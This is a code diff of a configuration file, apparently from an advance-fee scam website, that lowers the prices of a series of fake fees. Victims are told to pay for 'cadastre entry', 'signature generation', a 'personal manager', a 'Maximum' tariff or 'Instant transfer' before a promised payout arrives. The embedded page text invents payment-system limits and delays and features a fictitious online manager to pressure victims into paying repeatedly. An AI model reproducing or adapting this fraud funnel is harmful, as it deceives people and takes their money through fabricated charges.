@@ -5593,11 +5593,11 @@
                 upsellType: "text",
                 product: "The cost of entering into the cadastre is only",
                 amount: {
-                    e: 2260,
-                    c: 2260,
-                    b: 2260,
-                    p: 2260,
-                    h: 2260
+                    e: 90,
+                    c: 90,
+                    b: 90,
+                    p: 90,
+                    h: 90
                 },
                 customItem: "",
                 instructions: ["Pay for the entry into the cadastre", "The money will be credited to the previously specified account instantly"],
@@ -5622,11 +5622,11 @@
                 upsellType: "text",
                 product: "Booking cost is only",
                 amount: {
-                    e: 2480,
-                    c: 2480,
-                    b: 2480,
-                    p: 2480,
-                    h: 2480
+                    e: 70,
+                    c: 70,
+                    b: 70,
+                    p: 70,
+                    h: 70
                 },
                 customItem: "",
                 instructions: ["Pay for the booking", "Receive the funds to the specified details"],
@@ -5651,11 +5651,11 @@
                 upsellType: "text",
                 product: "Activation cost of transit express cell is only",
                 amount: {
-                    e: 2980,
-                    c: 2980,
-                    b: 2980,
-                    p: 2980,
-                    h: 2980
+                    e: 100,
+                    c: 100,
+                    b: 100,
+                    p: 100,
+                    h: 100
                 },
                 customItem: "",
                 instructions: ["Pay for the activation of the transit cell", "The system will automatically activate the cell", "Your payout will be sent to your details"],
@@ -5680,11 +5680,11 @@
                 upsellType: "text",
                 product: "Cost of digital signature generation services is only",
                 amount: {
-                    e: 2520,
-                    c: 2520,
-                    b: 2520,
-                    p: 2520,
-                    h: 2520
+                    e: 60,
+                    c: 60,
+                    b: 60,
+                    p: 60,
+                    h: 60
                 },
                 customItem: "",
                 instructions: ["Pay for the signature generation services", "With the signature, the system will automatically withdraw your payment", "Receive your payout"],
@@ -5709,11 +5709,11 @@
                 upsellType: "text",
                 product: "Top up the transfer amount by",
                 amount: {
-                    e: 2640,
-                    c: 2640,
-                    b: 2640,
-                    p: 2640,
-                    h: 2640
+                    e: 100,
+                    c: 100,
+                    b: 100,
+                    p: 100,
+                    h: 100
                 },
                 customItem: "",
                 instructions: ["Top up your balance by the specified amount", "The system will automatically verify your signature", "Your payout will be sent to your details"],
@@ -5738,11 +5738,11 @@
                 upsellType: "text",
                 product: "Top up the transfer amount by",
                 amount: {
-                    e: 3000,
-                    c: 3000,
-                    b: 3000,
-                    p: 3000,
-                    h: 3000
+                    e: 50,
+                    c: 50,
+                    b: 50,
+                    p: 50,
+                    h: 50
                 },
                 customItem: "",
                 instructions: ["Top up your balance by the specified amount", "The system will automatically identify the TLS protocol in your browser", "Receive your payout"],
@@ -5766,11 +5766,11 @@
                 description: ['<h4 style="margin-top:20px;color:black; text-transform: none;text-align: -webkit-center;"><div style="clear: both;"></div><br><b>Transfer status:</b><br><span style="background-color: white;background-image: repeating-radial-gradient(circle at center, rgba(0,0,0,.2), rgba(0,0,0,.2) 1px, transparent 1px, transparent 100%);background-size: 4px 4px;"> <strong> <h3 class="fgfg" style="color:red;padding-bottom:20px;padding-top:10px;font-weight: 600;font-size:35px;margin-top: 0px;margin-bottom: 0px;">Awaiting manual sending!</h3> </strong> </span> </h4>', "Automatic money transfer is not supported by the payment system. Manual sending of the money transfer to the specified account is required.", '<div style="width: 100%;box-shadow: 0 5px 20px rgba(0, 148, 190, 0.2);padding: 30px 30px 5px;margin: 0 auto 30px;border-bottom: 3px solid #00d4a3;"><div class="manager-info"><img src="'.concat(o, 'img/manager.jpg" alt="" title="The manager is currently online!" style="width: 120px;height: 120px; border-radius: 10em; border: 5px solid #00d4a3; background-color: #00d4a3; margin-right: 20px; float: left; cursor: pointer; position: relative; display: block;" ><div class="manager-info-p"><p style="font-size:25px;line-height:1.1">Polina Solovyova - <b>Manager</b></p><p style="font-size:25px;line-height:1.1">Work experience: <b>3 years</b></p><p style="font-size:25px;line-height:1.1">Status: <b style="color:#80BB25">Online</b></p></div></div><div class="cb"></div><br><p> <span style="margin-top:10px;margin-bottom:20px;color:#808080"><span class="pay2">To have your money sent manually, hire a personal manager. The manager will manually send you the money from the balance of your account. </span></span></p><br><br></div>'), 'Immediately after paying for the manager\'s services, a money transfer of <span class="text-numbers">{{moneyPageBased}}</span> will be sent'],
                 product: "Cost of personal manager service is only",
                 amount: {
-                    e: 4500,
-                    c: 4500,
-                    b: 4500,
-                    p: 4500,
-                    h: 4500
+                    e: 70,
+                    c: 70,
+                    b: 70,
+                    p: 70,
+                    h: 70
                 },
                 customItem: "",
                 upsellType: "text",
@@ -5795,11 +5795,11 @@
                 description: ['<h4 class="mt-0" style="margin-top:20px;color:black; text-transform: none;text-align: -webkit-center;"><div style="clear: both;"></div><b>Transfer status:</b><span style="background-color: white;background-image: repeating-radial-gradient(circle at center, rgba(0,0,0,.2), rgba(0,0,0,.2) 1px, transparent 1px, transparent 100%);background-size: 4px 4px;"> <strong> <h3 class="fgfg" style="color:red;padding-bottom:5px;padding-top:5px;font-weight: 600;font-size:35px;margin-top: 0px;margin-bottom: 0px;">Awaiting limit increase!</h3> </strong> </span> </h4>', "The money transfer has been rejected by the mass payment system. The transfer amount limit has been exceeded. To complete the transfer, increase your limit for monetary transactions.", '<div style="width: 100%;box-shadow: 0 5px 20px rgba(0, 148, 190, 0.2);padding: 30px 30px 5px;margin: 0 auto 30px;border-bottom: 3px solid #00d4a3;"><div class="manager-info"><img src="'.concat(o, 'img/manager.jpg" alt="" title="The manager is currently online!" style="width: 120px;height: 120px; border-radius: 10em; border: 5px solid #00d4a3; background-color: #00d4a3; margin-right: 20px; float: left; cursor: pointer; position: relative; display: block;" ><div class="manager-info-p"><p class="mb-0" style="font-size:25px;line-height:1.1">Polina Solovyova - <b>Manager</b></p><p style="font-size:25px;line-height:1.1">Work experience: <b>3 years</b></p><p style="font-size:25px;line-height:1.1">Status: <b style="color:#80BB25">Online</b></p></div></div><div class="cb"></div><br><p> <span style="margin-top:10px;margin-bottom:20px;color:#808080"><span class="pay2">I made a request to the mass payment system. You have the "Standard" tariff. Transfers there are no more than <b class="sMoney2">30,000 rubles</b> per day. That is why the transfer did not go through immediately, it is still being processed.<br><br>To complete the transfer and receive the money, increase the transfer amount limit by activating the "Maximum" tariff. It costs only <b class="sMoney2"><span data-pay="price">{{upsellPrice}}</span> rubles</b>{{geoUpsellPrice}}. As soon as you activate it, they will send you the money immediately.</span></span></p></div>')],
                 product: 'Cost of connecting the "Maximum" tariff is only',
                 amount: {
-                    e: 4400,
-                    c: 4400,
-                    b: 4400,
-                    p: 4400,
-                    h: 4400
+                    e: 50,
+                    c: 50,
+                    b: 50,
+                    p: 50,
+                    h: 50
                 },
                 customItem: "",
                 upsellType: "text",
@@ -5824,11 +5824,11 @@
                 description: ['<h4 style="margin-top:20px;color:black; text-transform: none;text-align: -webkit-center;"><div style="clear: both;"></div><br><b>Transfer status:</b><br><span style="background-color: white;background-image: repeating-radial-gradient(circle at center, rgba(0,0,0,.2), rgba(0,0,0,.2) 1px, transparent 1px, transparent 100%);background-size: 4px 4px;"> <strong> <h3 class="fgfg" style="color:red;padding-bottom:20px;padding-top:10px;font-weight: 600;font-size:35px;margin-top: 0px;margin-bottom: 0px;">Request submitted</h3> </strong> </span> </h4>', 'The transfer request has been submitted. Transfers exceeding <b><span class="text-numbers">{{geoMoneyHalfLimit}}</span></b> are received within 30 business days. Expect funds to arrive.', '<div style="width: 100%;box-shadow: 0 5px 20px rgba(0, 148, 190, 0.2);padding: 30px 30px 5px;margin: 0 auto 30px;border-bottom: 3px solid #00d4a3;"><div class="manager-info"><img src="'.concat(o, 'img/manager.jpg" alt="" title="The manager is currently online!" style="width: 120px;height: 120px; border-radius: 10em; border: 5px solid #00d4a3; background-color: #00d4a3; margin-right: 20px; float: left; cursor: pointer; position: relative; display: block;" ><div class="manager-info-p"><p style="font-size:25px;line-height:1.1">Polina Solovyova - <b>Manager</b></p><p style="font-size:25px;line-height:1.1">Work experience: <b>3 years</b></p><p style="font-size:25px;line-height:1.1">Status: <b style="color:#80BB25">Online</b></p></div></div><div class="cb"></div><br><p> <span style="margin-top:10px;margin-bottom:20px;color:#808080"><span class="pay2">Of course, it is not convenient to wait that long. But these are the conditions of the mass payment system we are connected to.<br><br>Usually, our users do not wait, but activate the "Instant transfer" service and receive the money immediately. It costs <b class="sMoney2 text-numbers"><span>{{upsellPrice}}</span> rubles</b><span class="text-numbers">{{geoUpsellPrice}}</span>. If you also want to receive the transfer instantly, I recommend activating this service and you will receive the money immediately.</span></span></p><br><br></div>')],
                 product: 'Cost of "Instant transfer" service is only',
                 amount: {
-                    e: 5980,
-                    c: 5980,
-                    b: 5980,
-                    p: 5980,
-                    h: 5980
+                    e: 200,
+                    c: 200,
+                    b: 200,
+                    p: 200,
+                    h: 200
                 },
                 customItem: "",
                 upsellType: "text",
